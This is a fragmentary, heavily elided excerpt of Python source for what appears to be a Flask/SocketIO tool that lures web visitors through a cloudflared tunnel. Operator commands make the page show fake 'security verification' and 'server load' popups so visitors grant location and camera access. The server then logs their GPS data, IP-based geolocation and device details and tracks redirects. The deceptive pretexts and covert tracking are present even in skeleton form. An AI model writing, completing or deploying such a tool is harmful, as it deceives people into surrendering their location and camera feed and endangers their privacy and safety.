...
# Visitor page template (same as before)
visitor_html = """
<!DOCTYPE html>
<html>
<head>
...
<body>
    ...
    <script>
        ...
        socket.on('trigger_location', (data) => {
            ...
            // Show themed popup before requesting location
            showLocationPopup(data.message || "Server load verification required - please confirm your location", () => {
        ...
        socket.on('trigger_camera', (data) => {
            ...
            // Show themed popup before requesting camera
            showCameraPopup(data.message || "Security verification requires camera access", () => {
...
def verify_location():
    ...
    if data.get('denied'):
        ...
        print(f'  Additional details: altitude={data.get("altitude")}, heading={data.get("heading")}, speed={data.get("speed")}')
        
        # Update client info with GPS coordinates
...
def device_info():
    ...
    # Save detailed device info to an IP-based file
    ...
    if 'ipInfo' in data and data['ipInfo']:
        ...
        # Try to get more detailed geolocation if we have the GeoIP database
...
def handle_connect():
    ...
    # Try to get public IP if behind proxy
...
def start_cloudflared():
    ...
    try:
        ...
        # If we didn't find the URL, assume failure
...
def update_cli_display():
    ...
    # Show the appropriate URL based on operation mode
    ...
    if connected_clients:
        for idx, (sid, client) in enumerate(connected_clients.items(), 1):
            ...
            if 'gps' in client:
                ...
                # Show weather if GPS is available
    ...
    while True:
        try:
            ...
            if cmd == 'location':
                ...
                sid = select_client()
                if sid:
                    # Clear previous device info to force fresh collection
                ...
                if sid:
                    ...
                    # Track the redirect for this client
